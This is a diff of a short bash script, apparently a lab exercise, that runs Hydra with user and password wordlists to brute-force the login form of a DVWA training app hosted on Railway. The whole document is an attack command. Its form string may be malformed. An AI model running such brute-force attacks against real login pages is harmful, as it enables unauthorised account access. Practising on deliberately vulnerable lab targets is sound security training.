@@ -1,14 +1,14 @@
 #!/bin/bash
 
 # Play 02 — Hydra DVWA em produção
-# Usa variável DVWA_HOST ou default
+# Usa variável DVWA_HOST ou default (sem incluir :80 no TARGET)
 
-TARGET="${DVWA_HOST:-web-dvwa-production.up.railway.app}:80"
+TARGET="${DVWA_HOST:-web-dvwa-production.up.railway.app}"
 
-echo "[*] Iniciando ataque com Hydra contra $TARGET..."
+echo "[*] Iniciando ataque com Hydra contra $TARGET:80..."
 
-# Hydra deve receber um único argumento começando em http-post-form://
-hydra -L users.txt -P passwords.txt \
+# Hydra com -s 80 para especificar porta, evitando ambiguidade no parser
+hydra -s 80 -L users.txt -P passwords.txt \
   "http-post-form://$TARGET/login.php:username=^USER^&password=^PASS^&Login=Login failed" \
   -o hydra-out.txt 2>&1
 
